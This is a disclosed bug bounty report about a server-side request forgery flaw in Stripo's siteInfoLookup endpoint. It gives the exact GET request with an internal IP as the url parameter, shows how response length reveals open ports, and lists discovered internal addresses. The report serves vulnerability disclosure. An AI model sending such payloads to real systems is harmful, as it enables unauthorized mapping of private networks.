# SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX

## Report Details
- **Report ID**: 738553
- **URL**: https://hackerone.com/reports/738553
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-15T16:40:02.588Z
- **Disclosed**: 2019-12-18T10:23:14.982Z

## Reporter
- **Username**: eliel
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
## Summary:
SSRF vulnerability allows mapping the internal network.

## Steps To Reproduce:
It is possible to run internal requests with the siteInfoLookup service.

```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080 HTTP/1.1
Host: my.stripo.email
```

Based on the response we know if the ip / port is available or not.

The port is not accesible in that IP.
```
Content-Length: 0
```

The port is accesible in that IP.
```
Content-Length: 114 (>0)
```

## Supporting Material/References:
I was able to identify some internal IP address and open ports:
10.0.0.2:8080
10.0.0.3:8080
10.0.0.4:8080
10.0.0.5:8080 <- NOT ACCESIBLE

## Impact

It is possible to use this vulnerability to map the internal network.

## Attachments
No attachments
